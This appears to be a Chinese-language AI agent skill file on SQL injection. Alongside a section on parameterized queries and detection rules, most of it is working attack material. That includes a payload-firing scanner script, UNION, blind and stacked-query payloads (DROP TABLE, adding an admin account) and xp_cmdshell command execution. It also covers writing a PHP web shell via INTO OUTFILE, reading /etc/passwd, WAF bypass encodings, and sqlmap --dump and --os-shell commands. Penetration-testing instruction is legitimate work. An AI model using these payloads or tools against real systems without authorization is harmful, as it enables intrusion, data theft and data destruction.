---
name: sql-injection
description: SQL注入漏洞利用与防御 - 包含多场景适配、绕过WAF、自动化工具使用、防御检测。用于Web渗透测试和代码安全审计。
---

# SQL注入漏洞深度利用与防御

## 1. 漏洞概述

### 1.1 基本信息
- **漏洞名称**: SQL注入 (SQL Injection)
- **CVE编号**: 通用漏洞，无特定CVE
- **严重程度**: Critical (CVSS 9.8+)
- **影响版本**: 所有未使用参数化查询的Web应用
- **利用难度**: 简单到中等

### 1.2 漏洞描述
SQL注入是一种代码注入攻击，攻击者通过Web应用对用户输入的不当处理，在数据库查询中插入恶意SQL语句，从而获取未授权数据、绕过认证、甚至执行系统命令。

### 1.3 影响范围
- 所有使用SQL数据库的Web应用
- 未使用参数化查询的语言：PHP, Python, Node.js, Java, C#
- 典型CMS: WordPress, Drupal, Joomla
- 典型框架: Django, Rails, Express, Spring

---

## 2. 技术原理

### 2.1 漏洞形成机制

```python
# 漏洞代码示例 (Python)
def get_user(user_id):
    # 直接拼接用户输入
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()

# 攻击者输入: 1 OR 1=1
# 实际执行: SELECT * FROM users WHERE id = 1 OR 1=1
# 返回所有用户！
```

### 2.2 数据流分析

```
用户输入 → 应用层拼接 → 数据库执行 → 返回结果
              ↑
         漏洞点：无过滤/未参数化
```

### 2.3 常见危险函数

| 语言 | 危险函数 | 安全替代 |
|------|----------|----------|
| PHP | mysql_query(), eval() | PDO预处理 |
| Python | execute(f"{sql}") | cursor.execute(sql, params) |
| Java | Statement.execute() | PreparedStatement |
| Node.js | mysql.query() | 参数化查询 |

---

## 3. 漏洞识别

### 3.1 代码特征检测

```python
# 检测规则（正则）
vulnerable_patterns = [
    r'execute\s*\(\s*f["\'].*\{',  # Python f-string拼接
    r'execute\s*\(\s*["\'].*%+',    # Python %拼接
    r'\$\w+\s*\.\s*query\s*\(',     # PHP直接拼接
    r'statement\s*\.\s*execute\s*\(', # Java未预处理
]
```

### 3.2 自动化检测脚本

```python
#!/usr/bin/env python3
"""
SQL注入自动化检测脚本
用法: python sql_injection_scanner.py http://target.com/page?id=1
"""

import sys
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

# 测试 payloads
PAYLOADS = [
    ("'", "单引号测试"),
    ("' OR '1'='1", "永真条件"),
    ("' AND '1'='2", "逻辑测试"),
    ("' WAITFOR DELAY '00:00:05'--", "时间盲注(MSSQL)"),
    ("' AND SLEEP(5)--", "时间盲注(MySQL)"),
    ("' UNION SELECT NULL--", "联合查询探测"),
]

# 错误特征
ERROR_PATTERNS = [
    "SQL syntax", "MySQL", "Warning: mysql",
    "mysql_fetch", "ORA-01756", "Microsoft SQL",
    "PostgreSQL", "pg_fetch", "SQLite",
]

class SQLInjectionScanner:
    def __init__(self, url, threads=5):
        self.url = url
        self.results = []
        self.threads = threads
        
    def test_payload(self, payload, description):
        """测试单个payload"""
        try:
            # 替换URL中的参数
            test_url = self.url + payload
            response = requests.get(test_url, timeout=10, verify=False)
            
            # 检查错误
            for pattern in ERROR_PATTERNS:
                if pattern.lower() in response.text.lower():
                    return True, f"发现漏洞! 特征: {pattern}"
            
            # 检查时间盲注
            if response.elapsed.total_seconds() > 4:
                return True, "发现时间盲注!"
                
            return False, ""
            
        except requests.exceptions.Timeout:
            return True, "请求超时，可能存在时间盲注"
        except Exception as e:
            return False, str(e)
    
    def scan(self):
        """执行扫描"""
        print(f"[*] 目标: {self.url}")
        
        for payload, desc in PAYLOADS:
            print(f"[*] 测试: {desc}")
            vulnerable, result = self.test_payload(payload, desc)
            
            if vulnerable:
                print(f"[+] 发现漏洞! {result}")
                self.results.append({
                    "payload": payload,
                    "description": desc,
                    "result": result
                })
        
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python sql_injection_scanner.py <目标URL>")
        sys.exit(1)
    
    scanner = SQLInjectionScanner(sys.argv[1])
    results = scanner.scan()
    
    if not results:
        print("[-] 未发现SQL注入")
```

---

## 4. 利用技术

### 4.1 UNION联合查询注入

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,column_name FROM information_schema.columns--
```

### 4.2 布尔盲注

```sql
' AND 1=1--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND (SELECT COUNT(*) FROM users)>0--
```

### 4.3 时间盲注

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '00:00:05'--
```

### 4.4 报错注入

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
```

### 4.5 堆叠查询注入

```sql
'; DROP TABLE users;--
'; INSERT INTO admin(username,password) VALUES('hacker','md5hash');--
'; exec xp_cmdshell('whoami');--
```

---

## 5. 场景适配

### 5.1 不同数据库

| 数据库 | 特点 | 注入语法 |
|--------|------|----------|
| **MySQL** | 最常见 | `SLEEP()`, `BENCHMARK()` |
| **PostgreSQL** | 功能强大 | `pg_sleep()`, `copy_cmd` |
| **MSSQL** | Windows常用 | `WAITFOR`, `xp_cmdshell` |
| **Oracle** | 较少见 | `DBMS_LOCK.SLEEP()` |
| **SQLite** | 轻量级 | 有限盲注 |

#### MySQL利用
```sql
-- 获取版本
SELECT @@version

-- 获取数据库
SELECT database()

-- 读取文件
SELECT LOAD_FILE('/etc/passwd')

-- 写入文件
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/shell.php'
```

#### MSSQL利用
```sql
-- 命令执行
EXEC xp_cmdshell 'whoami'

-- 启用xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### 5.2 不同权限

| 权限 | 可用技术 |
|------|----------|
| **DBA** | 命令执行、文件操作 |
| **普通用户** | 数据窃取 |
| **只读用户** | 盲注 |

### 5.3 不同网络环境

| 环境 | 利用方式 |
|------|----------|
| **外网** | 直接HTTP请求 |
| **内网** | 通过SQL注入探测内网 |
| **盲注** | DNS外带、HTTP外带 |

### 5.4 不同目标类型

| 目标 | 攻击目标 |
|------|----------|
| **登录页面** | 绕过认证 |
| **搜索框** | 数据窃取 |
| **ID参数** | UNION注入 |
| **Cookie** | 存储型注入 |

---

## 6. 绕过技术

### 6.1 WAF绕过

| WAF类型 | 绕过技术 | 示例 |
|---------|----------|------|
| **ModSecurity** | 注释干扰 | `/*!UNION*/ /*!SELECT*/` |
| **Cloudflare** | 大小写混合 | `UniOn SeLeCt` |
| **AWS WAF** | 编码绕过 | `%55NION%53ELECT` |
| **通用** | 空白符替换 | `%09UNION%09SELECT%09` |

```sql
-- 混淆绕过示例
'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--
' UNI/**/ON SEL/**/ECT 1,2,3--
'%55NION%53ELECT'
```

### 6.2 过滤绕过

| 过滤 | 绕过方式 |
|------|----------|
| `空格` | `%09`, `%0a`, `%0b`, `/**/` |
| `UNION` | `UniOn`, `%55NION` |
| `SELECT` | `%53ELECT`, 注释绕过 |
| `'` | `0x27`, `CHAR(39)` |

### 6.3 字符编码

```sql
-- Hex编码
0x554e494f4e

-- Char函数
CHAR(85,78,73,79,78)

-- Unicode
\u0055\u004e\u0049\u004f\u004e
```

---

## 7. 防御与检测

### 7.1 参数化查询（最佳方案）

```python
# Python (推荐)
import sqlite3

# 方案1: 参数化查询
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

# 方案2: ORM (Django)
user = User.objects.get(username=username, password=password)

# 方案3: SQLAlchemy
result = session.query(User).filter_by(username=username).first()
```

```php
// PHP (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```

```java
// Java (PreparedStatement)
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

### 7.2 输入验证

```python
def validate_input(user_input):
    # 白名单验证
    allowed_pattern = re.compile(r'^[a-zA-Z0-9_]+$')
    if not allowed_pattern.match(user_input):
        raise ValueError("Invalid input")
    
    # 类型验证
    if isinstance(user_input, str):
        user_input = int(user_input)  # 强制类型
    
    return user_input
```

### 7.3 最小权限原则

```sql
-- Web应用专用账户
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';

-- 仅授予必要权限
GRANT SELECT, INSERT, UPDATE ON webapp.* TO 'webapp'@'localhost';

-- 禁止危险权限
REVOKE FILE ON *.* FROM 'webapp'@'localhost';
REVOKE EXECUTE ON *.* FROM 'webapp'@'localhost';
```

### 7.4 检测规则

```yaml
# ModSecurity规则
SecRule ARGS:id "@rx ^\d+$" "deny,status:400,msg:'ID must be numeric'"
SecRule ARGS:username "@rx ^[a-zA-Z0-9_]{3,20}$" "pass"

# Snort规则
alert tcp any any -> any any (msg:"SQL Injection Attempt"; 
    content:"' OR '1'='1"; sid:1000001; rev:1;)
```

---

## 8. 自动化工具

### 8.1 sqlmap使用

```bash
# 基础扫描
sqlmap -u "http://target.com/page?id=1"

# 指定数据库
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D webapp --tables

# 获取数据
sqlmap -u "http://target.com/page?id=1" -D webapp -T users --dump

# 操作系统交互
sqlmap -u "http://target.com/page?id=1" --os-shell

# 代理模式
sqlmap -u "http://target.com/page?id=1" --proxy=http://127.0.0.1:8080

# 绕过WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
```

### 8.2 常用tamper脚本

```python
# space2comment.py
def tamper(payload, **kwargs):
    if payload:
        return payload.replace(" ", "/**/")
    return payload

# between.py (替换 > 为 BETWEEN)
def tamper(payload, **kwargs):
    if payload:
        return payload.replace(">", "BETWEEN 1 AND ")
    return payload

# randomcase.py (随机大小写)
def tamper(payload, **kwargs):
    import random
    result = ""
    for char in payload:
        result += char.upper() if random.random() > 0.5 else char.lower()
    return result
```

---

## 9. 实战案例

### 9.1 典型渗透测试

**目标**: 获取管理员权限

**步骤**:
1. 识别注入点 (`/?id=1`)
2. 确定数据库类型 (MySQL)
3. UNION注入获取用户表
4. 破解密码哈希
5. 登录后台
6. 获取OSShell

### 9.2 绕过WAF案例

**场景**: AWS WAF防护的目标

**绕过方法**:
```bash
sqlmap -u "http://target.com/search?q=test" \
  --tamper=space2comment,randomcase,charencode \
  --level=5 --risk=3
```

---

## 10. 参考资源

### 10.1 官方文档
- [SQLMap官网](https://sqlmap.org/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

### 10.2 学习资源
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [W3Schools SQL Tutorial](https://www.w3schools.com/sql/)

### 10.3 靶场
- DVWA (Damn Vulnerable Web Application)
- SQLi-Labs
- PentesterLab

---

*目标: 成为世界第一黑客 + AI安全专家*
*类型: Web安全*
